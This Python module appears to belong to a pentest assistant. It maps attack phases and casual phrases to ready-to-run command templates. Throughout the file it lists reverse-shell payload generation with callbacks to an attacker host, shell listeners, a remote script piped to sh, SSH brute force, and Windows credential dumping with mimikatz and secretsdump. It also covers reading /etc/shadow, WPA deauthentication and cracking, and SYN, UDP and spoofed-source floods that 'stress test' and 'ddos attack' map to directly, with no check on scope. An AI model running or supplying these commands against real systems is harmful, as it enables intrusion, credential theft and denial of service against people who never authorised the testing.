"""
Maxim Workflows — Pentest phase-based suggestions and online tool integration.
"""

# ── Pentest Phase Workflows ──
# Each phase has suggested steps with specific tools and commands

PHASES = [
    {
        "id": "recon",
        "name": "Reconnaissance",
        "icon": "🔍",
        "color": "#3498db",
        "description": "Gather information about the target before engaging",
        "steps": [
            {
                "name": "Passive OSINT",
                "description": "Gather info without touching the target",
                "suggestions": [
                    {"tool": "whois", "cmd": "whois {target}", "desc": "Domain registration info"},
                    {"tool": "theHarvester", "cmd": "theHarvester -d {target} -b all -l 500", "desc": "Emails, subdomains, IPs"},
                    {"tool": "dnsenum", "cmd": "dnsenum {target}", "desc": "DNS records & zone transfers"},
                    {"tool": "curl", "cmd": "curl -sI https://{target}", "desc": "HTTP headers / server info"},
                    {"tool": "dig", "cmd": "dig {target} ANY +noall +answer", "desc": "All DNS records"},
                    {"tool": "host", "cmd": "host -t mx {target}", "desc": "Mail server records"},
                    {"tool": "whatweb", "cmd": "whatweb -v {target}", "desc": "Web technology fingerprint"},
                ],
                "online_tools": [
                    {"name": "Shodan", "url": "https://www.shodan.io/search?query={target}", "desc": "Internet-connected device search"},
                    {"name": "Censys", "url": "https://search.censys.io/hosts?q={target}", "desc": "Internet asset discovery"},
                    {"name": "crt.sh", "url": "https://crt.sh/?q=%25.{target}", "desc": "SSL certificate transparency logs"},
                    {"name": "SecurityTrails", "url": "https://securitytrails.com/domain/{target}/dns", "desc": "Historical DNS data"},
                    {"name": "Hunter.io", "url": "https://hunter.io/search/{target}", "desc": "Email address finder"},
                    {"name": "BuiltWith", "url": "https://builtwith.com/{target}", "desc": "Technology profiler"},
                    {"name": "Wayback Machine", "url": "https://web.archive.org/web/*/{target}", "desc": "Historical snapshots"},
                    {"name": "DNSDumpster", "url": "https://dnsdumpster.com", "desc": "DNS recon & research"},
                    {"name": "VirusTotal", "url": "https://www.virustotal.com/gui/domain/{target}", "desc": "Domain/IP reputation"},
                ],
            },
            {
                "name": "Active Discovery",
                "description": "Direct interaction with the target",
                "suggestions": [
                    {"tool": "nmap", "cmd": "nmap -sn {target}/24", "desc": "Ping sweep — find live hosts"},
                    {"tool": "nmap", "cmd": "nmap -sV -sC -O {target}", "desc": "Service version + OS detection"},
                    {"tool": "nmap", "cmd": "nmap -p- -T4 {target}", "desc": "Full 65535 port scan"},
                    {"tool": "masscan", "cmd": "masscan {target}/24 --top-ports 1000 --rate 1000", "desc": "Fast mass port scan"},
                    {"tool": "netdiscover", "cmd": "netdiscover -r {target}/24", "desc": "ARP-based host discovery"},
                    {"tool": "traceroute", "cmd": "traceroute {target}", "desc": "Network path to target"},
                    {"tool": "ping", "cmd": "ping -c 4 {target}", "desc": "Basic connectivity check"},
                ],
                "online_tools": [
                    {"name": "Nmap Online", "url": "https://nmap.online", "desc": "Online port scanner"},
                    {"name": "MXToolbox", "url": "https://mxtoolbox.com/SuperTool.aspx?action=dns:{target}", "desc": "DNS/MX/Blacklist check"},
                    {"name": "Ping.eu", "url": "https://ping.eu/port-chk/", "desc": "Online port check"},
                ],
            },
            {
                "name": "Subdomain Enum",
                "description": "Find all subdomains of the target",
                "suggestions": [
                    {"tool": "gobuster", "cmd": "gobuster dns -d {target} -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50", "desc": "DNS brute force subdomains"},
                    {"tool": "ffuf", "cmd": "ffuf -u http://FUZZ.{target} -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302", "desc": "Virtual host discovery"},
                    {"tool": "dnsenum", "cmd": "dnsenum --enum {target}", "desc": "Full DNS enumeration"},
                    {"tool": "amass", "cmd": "amass enum -d {target}", "desc": "Deep subdomain enumeration"},
                    {"tool": "sublist3r", "cmd": "sublist3r -d {target}", "desc": "Fast subdomain finder"},
                ],
                "online_tools": [
                    {"name": "crt.sh", "url": "https://crt.sh/?q=%25.{target}", "desc": "Certificate transparency"},
                    {"name": "Subdomainfinder", "url": "https://subdomainfinder.c99.nl/scans/{target}", "desc": "Online subdomain scan"},
                ],
            },
        ]
    },
    {
        "id": "enumeration",
        "name": "Enumeration",
        "icon": "📋",
        "color": "#2ecc71",
        "description": "Deep-dive into discovered services to find attack vectors",
        "steps": [
            {
                "name": "Service Enumeration",
                "description": "Probe discovered services for details",
                "suggestions": [
                    {"tool": "nmap", "cmd": "nmap -sV -sC -p {ports} {target}", "desc": "Version + default scripts on specific ports"},
                    {"tool": "nmap", "cmd": "nmap --script banner -p {ports} {target}", "desc": "Grab service banners"},
                    {"tool": "nmap", "cmd": "nmap -sU --top-ports 50 {target}", "desc": "Top UDP ports"},
                    {"tool": "netcat", "cmd": "nc -nv {target} {port}", "desc": "Manual banner grab"},
                    {"tool": "amap", "cmd": "amap -d {target} {ports}", "desc": "Application protocol detection"},
                ],
                "online_tools": [],
            },
            {
                "name": "Web Enumeration",
                "description": "Map out web applications",
                "suggestions": [
                    {"tool": "gobuster", "cmd": "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt,js", "desc": "Directory + file brute force"},
                    {"tool": "ffuf", "cmd": "ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/big.txt -mc 200,301,302,403 -o ffuf_results.json", "desc": "Fast web fuzzing with output"},
                    {"tool": "dirb", "cmd": "dirb http://{target} /usr/share/wordlists/dirb/common.txt", "desc": "Classic directory scanner"},
                    {"tool": "nikto", "cmd": "nikto -h http://{target} -o nikto_report.html -Format htm", "desc": "Web vulnerability scan"},
                    {"tool": "wpscan", "cmd": "wpscan --url http://{target} -e ap,at,u --plugins-detection aggressive", "desc": "WordPress full enum"},
                    {"tool": "whatweb", "cmd": "whatweb -a 3 {target}", "desc": "Aggressive tech fingerprint"},
                    {"tool": "wafw00f", "cmd": "wafw00f {target}", "desc": "WAF detection"},
                    {"tool": "curl", "cmd": "curl -s http://{target}/robots.txt", "desc": "Check robots.txt"},
                    {"tool": "curl", "cmd": "curl -s http://{target}/sitemap.xml", "desc": "Check sitemap"},
                ],
                "online_tools": [
                    {"name": "Wappalyzer", "url": "https://www.wappalyzer.com/lookup/{target}", "desc": "Technology profiler"},
                    {"name": "SecurityHeaders", "url": "https://securityheaders.com/?q={target}", "desc": "HTTP header analysis"},
                    {"name": "SSL Labs", "url": "https://www.ssllabs.com/ssltest/analyze.html?d={target}", "desc": "SSL/TLS configuration test"},
                    {"name": "Mozilla Observatory", "url": "https://observatory.mozilla.org/analyze/{target}", "desc": "Web security assessment"},
                ],
            },
            {
                "name": "SMB / NetBIOS",
                "description": "Windows network service enumeration",
                "suggestions": [
                    {"tool": "enum4linux", "cmd": "enum4linux -a {target}", "desc": "Full SMB/RPC enumeration"},
                    {"tool": "smbclient", "cmd": "smbclient -L //{target}/ -N", "desc": "List SMB shares (null session)"},
                    {"tool": "smbmap", "cmd": "smbmap -H {target}", "desc": "SMB share permissions map"},
                    {"tool": "crackmapexec", "cmd": "crackmapexec smb {target} --shares", "desc": "Enum shares via CME"},
                    {"tool": "nmap", "cmd": "nmap --script smb-enum-shares,smb-enum-users -p 445 {target}", "desc": "NSE SMB scripts"},
                    {"tool": "rpcclient", "cmd": "rpcclient -U '' -N {target}", "desc": "RPC null session"},
                    {"tool": "nbtscan", "cmd": "nbtscan {target}/24", "desc": "NetBIOS name scan"},
                ],
                "online_tools": [],
            },
            {
                "name": "SNMP Enumeration",
                "description": "Simple Network Management Protocol probing",
                "suggestions": [
                    {"tool": "snmpwalk", "cmd": "snmpwalk -v2c -c public {target}", "desc": "SNMP walk with default community"},
                    {"tool": "onesixtyone", "cmd": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {target}", "desc": "Brute force community strings"},
                    {"tool": "nmap", "cmd": "nmap -sU -p 161 --script snmp-info {target}", "desc": "SNMP info via nmap"},
                ],
                "online_tools": [],
            },
            {
                "name": "LDAP / Active Directory",
                "description": "Directory service enumeration",
                "suggestions": [
                    {"tool": "ldapsearch", "cmd": "ldapsearch -x -H ldap://{target} -b '' -s base namingContexts", "desc": "LDAP base DN discovery"},
                    {"tool": "nmap", "cmd": "nmap --script ldap-search -p 389 {target}", "desc": "NSE LDAP enum"},
                    {"tool": "crackmapexec", "cmd": "crackmapexec ldap {target} -u '' -p '' --kdcHost {target}", "desc": "CME LDAP enum"},
                    {"tool": "bloodhound-python", "cmd": "bloodhound-python -u {user} -p {pass} -d {domain} -c All", "desc": "BloodHound AD data collection"},
                ],
                "online_tools": [],
            },
        ]
    },
    {
        "id": "vuln_scan",
        "name": "Vulnerability Scanning",
        "icon": "🐛",
        "color": "#e67e22",
        "description": "Identify known vulnerabilities in discovered services",
        "steps": [
            {
                "name": "Automated Vuln Scan",
                "description": "Scan for known CVEs and misconfigurations",
                "suggestions": [
                    {"tool": "nmap", "cmd": "nmap --script vuln -p {ports} {target}", "desc": "NSE vulnerability scripts"},
                    {"tool": "nmap", "cmd": "nmap --script 'safe and vuln' {target}", "desc": "Safe vuln checks only"},
                    {"tool": "nikto", "cmd": "nikto -h http://{target} -Tuning x", "desc": "Full web vuln scan"},
                    {"tool": "searchsploit", "cmd": "searchsploit {service} {version}", "desc": "Search ExploitDB offline"},
                    {"tool": "lynis", "cmd": "lynis audit system --quick", "desc": "Local system audit"},
                ],
                "online_tools": [
                    {"name": "Exploit-DB", "url": "https://www.exploit-db.com/search?q={target}", "desc": "Public exploit database"},
                    {"name": "NVD (NIST)", "url": "https://nvd.nist.gov/vuln/search/results?query={target}", "desc": "National Vulnerability Database"},
                    {"name": "CVE Details", "url": "https://www.cvedetails.com/google-search-results.php?q={target}", "desc": "CVE search"},
                    {"name": "VulnDB", "url": "https://vuldb.com/?search={target}", "desc": "Vulnerability database"},
                ],
            },
            {
                "name": "Web Application Vulns",
                "description": "Test for OWASP Top 10 and web-specific issues",
                "suggestions": [
                    {"tool": "sqlmap", "cmd": "sqlmap -u 'http://{target}/?id=1' --batch --dbs", "desc": "SQL injection test"},
                    {"tool": "sqlmap", "cmd": "sqlmap -u 'http://{target}' --forms --batch --crawl=2", "desc": "Auto-find and test forms"},
                    {"tool": "wpscan", "cmd": "wpscan --url http://{target} --enumerate vp,vt", "desc": "WordPress vuln plugins/themes"},
                    {"tool": "commix", "cmd": "commix -u 'http://{target}/?cmd=test'", "desc": "Command injection test"},
                    {"tool": "xsstrike", "cmd": "xsstrike -u 'http://{target}/?search=test'", "desc": "XSS scanner"},
                    {"tool": "dalfox", "cmd": "dalfox url 'http://{target}/?q=test'", "desc": "Parameter-based XSS scan"},
                ],
                "online_tools": [
                    {"name": "VirusTotal URL", "url": "https://www.virustotal.com/gui/url/{target}", "desc": "URL reputation check"},
                    {"name": "URLScan", "url": "https://urlscan.io/search/#domain:{target}", "desc": "URL scanning service"},
                ],
            },
        ]
    },
    {
        "id": "exploitation",
        "name": "Exploitation",
        "icon": "💥",
        "color": "#e74c3c",
        "description": "Leverage discovered vulnerabilities to gain access",
        "steps": [
            {
                "name": "Exploit Frameworks",
                "description": "Use frameworks for exploitation",
                "suggestions": [
                    {"tool": "metasploit", "cmd": "msfconsole -x 'search {query}; info'", "desc": "Search exploits in MSF"},
                    {"tool": "metasploit", "cmd": "msfconsole -x 'use {module}; set RHOSTS {target}; set LHOST {lhost}; exploit'", "desc": "Quick exploit execution"},
                    {"tool": "searchsploit", "cmd": "searchsploit -m {exploit_id}", "desc": "Copy exploit to current dir"},
                    {"tool": "msfvenom", "cmd": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT=4444 -f elf -o rev.elf", "desc": "Linux reverse shell payload"},
                    {"tool": "msfvenom", "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT=4444 -f exe -o rev.exe", "desc": "Windows meterpreter payload"},
                ],
                "online_tools": [
                    {"name": "Exploit-DB", "url": "https://www.exploit-db.com", "desc": "Exploit database"},
                    {"name": "GTFOBins", "url": "https://gtfobins.github.io", "desc": "Unix binary exploitation"},
                    {"name": "LOLBAS", "url": "https://lolbas-project.github.io", "desc": "Windows LOL binaries"},
                    {"name": "PayloadsAllTheThings", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings", "desc": "Payload cheat sheets"},
                    {"name": "RevShells", "url": "https://www.revshells.com", "desc": "Reverse shell generator"},
                ],
            },
            {
                "name": "Password Attacks",
                "description": "Crack or brute-force credentials",
                "suggestions": [
                    {"tool": "hydra", "cmd": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt {target} ssh", "desc": "SSH brute force"},
                    {"tool": "hydra", "cmd": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt {target} http-post-form '{path}:{params}:{fail}'", "desc": "HTTP form brute force"},
                    {"tool": "john", "cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt {hashfile}", "desc": "Crack hashes with wordlist"},
                    {"tool": "hashcat", "cmd": "hashcat -m {mode} -a 0 {hashfile} /usr/share/wordlists/rockyou.txt", "desc": "GPU hash cracking"},
                    {"tool": "crackmapexec", "cmd": "crackmapexec smb {target} -u users.txt -p passwords.txt", "desc": "SMB credential spray"},
                    {"tool": "medusa", "cmd": "medusa -h {target} -U users.txt -P passwords.txt -M ssh -t 4", "desc": "Parallel SSH brute force"},
                ],
                "online_tools": [
                    {"name": "CrackStation", "url": "https://crackstation.net", "desc": "Online hash lookup"},
                    {"name": "Hashes.com", "url": "https://hashes.com/en/decrypt/hash", "desc": "Hash decryption service"},
                    {"name": "HashKiller", "url": "https://hashkiller.io", "desc": "Hash cracker"},
                ],
            },
            {
                "name": "Shells & Listeners",
                "description": "Set up reverse/bind shells",
                "suggestions": [
                    {"tool": "netcat", "cmd": "nc -lvnp 4444", "desc": "Simple listener on 4444"},
                    {"tool": "socat", "cmd": "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane", "desc": "Stable TTY listener"},
                    {"tool": "metasploit", "cmd": "msfconsole -x 'use multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT 4444; run'", "desc": "MSF multi handler"},
                    {"tool": "pwncat", "cmd": "pwncat-cs -lp 4444", "desc": "pwncat listener (auto-upgrade)"},
                    {"tool": "rlwrap", "cmd": "rlwrap nc -lvnp 4444", "desc": "Listener with readline support"},
                ],
                "online_tools": [
                    {"name": "RevShells", "url": "https://www.revshells.com", "desc": "Generate reverse shell one-liners"},
                ],
            },
        ]
    },
    {
        "id": "post_exploit",
        "name": "Post-Exploitation",
        "icon": "🏴",
        "color": "#9b59b6",
        "description": "Maintain access, escalate privileges, move laterally",
        "steps": [
            {
                "name": "Privilege Escalation",
                "description": "Escalate from user to root/admin",
                "suggestions": [
                    {"tool": "linpeas", "cmd": "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", "desc": "Linux privilege escalation audit"},
                    {"tool": "sudo", "cmd": "sudo -l", "desc": "Check sudo permissions"},
                    {"tool": "find", "cmd": "find / -perm -4000 -type f 2>/dev/null", "desc": "Find SUID binaries"},
                    {"tool": "find", "cmd": "find / -writable -type f 2>/dev/null | grep -v proc", "desc": "Find world-writable files"},
                    {"tool": "cat", "cmd": "cat /etc/crontab && ls -la /etc/cron.*", "desc": "Check cron jobs"},
                    {"tool": "getcap", "cmd": "getcap -r / 2>/dev/null", "desc": "Find binaries with capabilities"},
                    {"tool": "ps", "cmd": "ps aux | grep root", "desc": "Processes running as root"},
                ],
                "online_tools": [
                    {"name": "GTFOBins", "url": "https://gtfobins.github.io", "desc": "Unix SUID/sudo exploitation"},
                    {"name": "LOLBAS", "url": "https://lolbas-project.github.io", "desc": "Windows living-off-the-land"},
                    {"name": "HackTricks", "url": "https://book.hacktricks.xyz/linux-hardening/privilege-escalation", "desc": "Privesc cheat sheets"},
                ],
            },
            {
                "name": "Lateral Movement",
                "description": "Move to other machines on the network",
                "suggestions": [
                    {"tool": "impacket", "cmd": "impacket-psexec {domain}/{user}:{pass}@{target}", "desc": "PsExec via Impacket"},
                    {"tool": "impacket", "cmd": "impacket-wmiexec {domain}/{user}:{pass}@{target}", "desc": "WMI execution"},
                    {"tool": "impacket", "cmd": "impacket-smbexec {domain}/{user}:{pass}@{target}", "desc": "SMB execution"},
                    {"tool": "crackmapexec", "cmd": "crackmapexec smb {target}/24 -u {user} -H {hash} --sam", "desc": "Pass-the-hash + dump SAM"},
                    {"tool": "evil-winrm", "cmd": "evil-winrm -i {target} -u {user} -p {pass}", "desc": "WinRM shell"},
                    {"tool": "chisel", "cmd": "chisel server --reverse -p 8080", "desc": "Pivot tunnel server"},
                    {"tool": "ssh", "cmd": "ssh -D 1080 {user}@{target}", "desc": "SOCKS proxy via SSH"},
                    {"tool": "proxychains", "cmd": "proxychains4 nmap -sT -Pn {internal_target}", "desc": "Scan via pivot"},
                ],
                "online_tools": [],
            },
            {
                "name": "Data Exfiltration & Loot",
                "description": "Extract valuable data",
                "suggestions": [
                    {"tool": "impacket", "cmd": "impacket-secretsdump {domain}/{user}:{pass}@{target}", "desc": "Dump NTDS/SAM hashes"},
                    {"tool": "mimikatz", "cmd": "mimikatz 'privilege::debug' 'sekurlsa::logonpasswords' exit", "desc": "Dump Windows credentials"},
                    {"tool": "find", "cmd": "find / -name '*.conf' -o -name '*.bak' -o -name '*.old' 2>/dev/null | head -50", "desc": "Find config/backup files"},
                    {"tool": "grep", "cmd": "grep -rl 'password' /etc/ /var/ /home/ 2>/dev/null | head -20", "desc": "Search for password strings"},
                    {"tool": "cat", "cmd": "cat /etc/shadow", "desc": "Read shadow file (if root)"},
                ],
                "online_tools": [],
            },
        ]
    },
    {
        "id": "wireless",
        "name": "Wireless Attacks",
        "icon": "📡",
        "color": "#1abc9c",
        "description": "WiFi reconnaissance, capture, and cracking",
        "steps": [
            {
                "name": "Setup & Recon",
                "description": "Prepare interface and scan for networks",
                "suggestions": [
                    {"tool": "airmon-ng", "cmd": "airmon-ng", "desc": "List wireless interfaces"},
                    {"tool": "airmon-ng", "cmd": "airmon-ng check kill", "desc": "Kill interfering processes"},
                    {"tool": "airmon-ng", "cmd": "airmon-ng start {iface}", "desc": "Enable monitor mode"},
                    {"tool": "airodump-ng", "cmd": "airodump-ng {iface}mon", "desc": "Scan all nearby networks"},
                    {"tool": "wash", "cmd": "wash -i {iface}mon", "desc": "Find WPS-enabled networks"},
                    {"tool": "iwconfig", "cmd": "iwconfig", "desc": "Show wireless interface config"},
                    {"tool": "iw", "cmd": "iw dev {iface} scan | grep -E 'SSID|signal|freq'", "desc": "Quick AP scan with signal strength"},
                ],
                "online_tools": [
                    {"name": "WiGLE", "url": "https://wigle.net", "desc": "Wireless network map database"},
                ],
            },
            {
                "name": "Capture & Attack",
                "description": "Capture handshakes and perform attacks",
                "suggestions": [
                    {"tool": "airodump-ng", "cmd": "airodump-ng -c {channel} --bssid {bssid} -w capture {iface}mon", "desc": "Capture on specific AP"},
                    {"tool": "aireplay-ng", "cmd": "aireplay-ng -0 5 -a {bssid} {iface}mon", "desc": "Deauth to force handshake"},
                    {"tool": "aireplay-ng", "cmd": "aireplay-ng -0 5 -a {bssid} -c {client} {iface}mon", "desc": "Targeted deauth"},
                    {"tool": "wifite", "cmd": "wifite --wpa --kill", "desc": "Automated WPA attack"},
                    {"tool": "reaver", "cmd": "reaver -i {iface}mon -b {bssid} -vv -K 1", "desc": "WPS Pixie Dust attack"},
                    {"tool": "bettercap", "cmd": "bettercap -iface {iface}mon", "desc": "Interactive wireless attacks"},
                ],
                "online_tools": [],
            },
            {
                "name": "Crack",
                "description": "Crack captured handshakes",
                "suggestions": [
                    {"tool": "aircrack-ng", "cmd": "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap", "desc": "Crack WPA with wordlist"},
                    {"tool": "hashcat", "cmd": "hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt", "desc": "GPU crack WPA (PMKID/handshake)"},
                    {"tool": "hcxpcapngtool", "cmd": "hcxpcapngtool -o capture.hc22000 capture-01.cap", "desc": "Convert cap to hashcat format"},
                    {"tool": "john", "cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt capture.hccapx", "desc": "John the Ripper on capture"},
                    {"tool": "crunch", "cmd": "crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - capture-01.cap -e {ssid}", "desc": "Generated wordlist pipe to aircrack"},
                ],
                "online_tools": [],
            },
            {
                "name": "Cleanup",
                "description": "Restore interface to normal",
                "suggestions": [
                    {"tool": "airmon-ng", "cmd": "airmon-ng stop {iface}mon", "desc": "Disable monitor mode"},
                    {"tool": "systemctl", "cmd": "sudo systemctl restart NetworkManager", "desc": "Restart NetworkManager"},
                    {"tool": "macchanger", "cmd": "macchanger -p {iface}", "desc": "Reset MAC to permanent"},
                ],
                "online_tools": [],
            },
        ]
    },
    {
        "id": "reporting",
        "name": "Reporting & Cleanup",
        "icon": "📄",
        "color": "#7f8c8d",
        "description": "Document findings and clean up",
        "steps": [
            {
                "name": "Evidence Collection",
                "description": "Organize and document findings",
                "suggestions": [
                    {"tool": "script", "cmd": "script -a pentest_session.log", "desc": "Record terminal session"},
                    {"tool": "nmap", "cmd": "nmap -sV {target} -oA nmap_final_report", "desc": "Final nmap scan with all output formats"},
                    {"tool": "tree", "cmd": "tree -h loot/", "desc": "List collected loot files"},
                    {"tool": "tar", "cmd": "tar czf evidence_$(date +%Y%m%d).tar.gz loot/ scans/ screenshots/", "desc": "Bundle evidence"},
                ],
                "online_tools": [
                    {"name": "Dradis", "url": "https://dradis.com", "desc": "Pentest collaboration & reporting"},
                ],
            },
        ]
    },
]

# ── Additional Online Resources ──
ONLINE_RESOURCES = [
    {"name": "Shodan", "url": "https://www.shodan.io", "desc": "Search engine for internet-connected devices", "category": "recon"},
    {"name": "Censys", "url": "https://search.censys.io", "desc": "Internet-wide scanning data", "category": "recon"},
    {"name": "VirusTotal", "url": "https://www.virustotal.com", "desc": "File/URL/IP malware analysis", "category": "analysis"},
    {"name": "AbuseIPDB", "url": "https://www.abuseipdb.com", "desc": "IP abuse/reputation check", "category": "recon"},
    {"name": "Exploit-DB", "url": "https://www.exploit-db.com", "desc": "Public exploit archive", "category": "exploitation"},
    {"name": "CrackStation", "url": "https://crackstation.net", "desc": "Free online hash lookup", "category": "password"},
    {"name": "GTFOBins", "url": "https://gtfobins.github.io", "desc": "Unix binary exploitation reference", "category": "privesc"},
    {"name": "LOLBAS", "url": "https://lolbas-project.github.io", "desc": "Windows LOL binaries", "category": "privesc"},
    {"name": "HackTricks", "url": "https://book.hacktricks.xyz", "desc": "Comprehensive hacking book", "category": "reference"},
    {"name": "PayloadsAllTheThings", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings", "desc": "Payload & bypass cheatsheets", "category": "exploitation"},
    {"name": "RevShells", "url": "https://www.revshells.com", "desc": "Reverse shell generator", "category": "exploitation"},
    {"name": "CyberChef", "url": "https://gchq.github.io/CyberChef", "desc": "Data encoding/decoding/analysis", "category": "analysis"},
    {"name": "DNSDumpster", "url": "https://dnsdumpster.com", "desc": "DNS recon & research", "category": "recon"},
    {"name": "crt.sh", "url": "https://crt.sh", "desc": "Certificate transparency log search", "category": "recon"},
    {"name": "Hashcat Wiki", "url": "https://hashcat.net/wiki/doku.php?id=example_hashes", "desc": "Hash type identification", "category": "password"},
]


# ── Smart command mapping for natural language ──
# Extends the SmartRouter with more granular mappings

NATURAL_COMMANDS = {
    # Exact phrase -> (tool, command, description)
    "scan networks": ("airodump-ng", "airodump-ng {iface}mon", "Scan nearby WiFi networks"),
    "scan wifi": ("airodump-ng", "airodump-ng {iface}mon", "Scan nearby WiFi networks"),
    "monitor mode": ("airmon-ng", "airmon-ng start {iface}", "Enable monitor mode"),
    "disable monitor": ("airmon-ng", "airmon-ng stop {iface}mon", "Disable monitor mode"),
    "scan ports": ("nmap", "nmap -sV -sC {target}", "Port scan with version detection"),
    "scan all ports": ("nmap", "nmap -p- -T4 {target}", "Full 65535 port scan"),
    "find hosts": ("nmap", "nmap -sn {target}/24", "Discover live hosts"),
    "who is on network": ("nmap", "nmap -sn 192.168.1.0/24", "Discover devices on local network"),
    "who is on my network": ("nmap", "nmap -sn 192.168.1.0/24", "Discover devices on local network"),
    "scan web": ("nikto", "nikto -h http://{target}", "Web vulnerability scan"),
    "find directories": ("gobuster", "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt", "Brute force web directories"),
    "crack hash": ("john", "john --wordlist=/usr/share/wordlists/rockyou.txt {hashfile}", "Crack password hashes"),
    "start listener": ("netcat", "nc -lvnp {port}", "Start netcat listener"),
    "capture packets": ("tcpdump", "tcpdump -i {iface} -w capture.pcap", "Capture network traffic"),
    "change mac": ("macchanger", "macchanger -r {iface}", "Randomize MAC address"),
    "start tor": ("tor", "sudo service tor start && echo 'Tor started'", "Start Tor service"),
    "check ip": ("ip", "ip -c addr show", "Show network interfaces"),
    "my ip": ("curl", "curl -s ifconfig.me && echo '' && ip -c addr show", "Show public + local IP"),
    "brute force ssh": ("hydra", "hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target}", "SSH brute force"),
    "sql injection": ("sqlmap", "sqlmap -u '{url}' --batch --dbs", "Test for SQL injection"),
    "start metasploit": ("metasploit", "sudo msfdb init && msfconsole", "Launch Metasploit"),
    "search exploit": ("searchsploit", "searchsploit {query}", "Search ExploitDB"),
    "arp scan": ("netdiscover", "sudo netdiscover -r 192.168.1.0/24", "ARP-based host discovery"),
    "sniff traffic": ("wireshark", "wireshark", "Launch Wireshark"),
    "deauth": ("aireplay-ng", "aireplay-ng -0 10 -a {bssid} {iface}mon", "Deauthentication attack"),
    "wps attack": ("reaver", "reaver -i {iface}mon -b {bssid} -vv -K 1", "WPS Pixie Dust attack"),
    # ── Stress Testing / DoS ──
    "syn flood": ("hping3", "hping3 -S --flood -V -p 80 {target}", "SYN flood attack"),
    "udp flood": ("hping3", "hping3 --udp --flood -p 53 {target}", "UDP flood attack"),
    "icmp flood": ("hping3", "hping3 --icmp --flood {target}", "ICMP flood attack"),
    "ping flood": ("ping", "ping -f -s 65500 {target}", "Ping flood attack"),
    "ping of death": ("ping", "ping -s 65500 -c 100 {target}", "Ping of death (oversized ICMP)"),
    "slowloris": ("slowloris", "slowloris {target} -p 80 -s 500", "HTTP slowloris DoS"),
    "http flood": ("slowloris", "slowloris {target} -p 80 -s 500", "HTTP connection exhaustion"),
    "ssl dos": ("thc-ssl-dos", "thc-ssl-dos {target} 443 --accept", "SSL renegotiation DoS"),
    "stress test": ("hping3", "hping3 -S --flood -V -p 80 {target}", "Stress test with SYN flood"),
    "dos attack": ("hping3", "hping3 -S --flood -V -p 80 {target}", "SYN flood DoS attack"),
    "ddos attack": ("hping3", "hping3 -S --flood --rand-source -p 80 {target}", "SYN flood with spoofed source"),
    "christmas attack": ("hping3", "hping3 --flood -FSRPAU -p 80 {target}", "XMAS tree packet flood"),
    "xmas attack": ("hping3", "hping3 --flood -FSRPAU -p 80 {target}", "XMAS tree packet flood"),
    "land attack": ("hping3", "hping3 -S -a {target} -p 80 --flood {target}", "Land attack (spoofed source=target)"),
    "goldeneye": ("goldeneye", "goldeneye http://{target} -w 50 -s 500", "GoldenEye HTTP DoS"),
}


def get_phase(phase_id: str) -> dict:
    for p in PHASES:
        if p["id"] == phase_id:
            return p
    return None


def get_all_phases() -> list:
    return PHASES
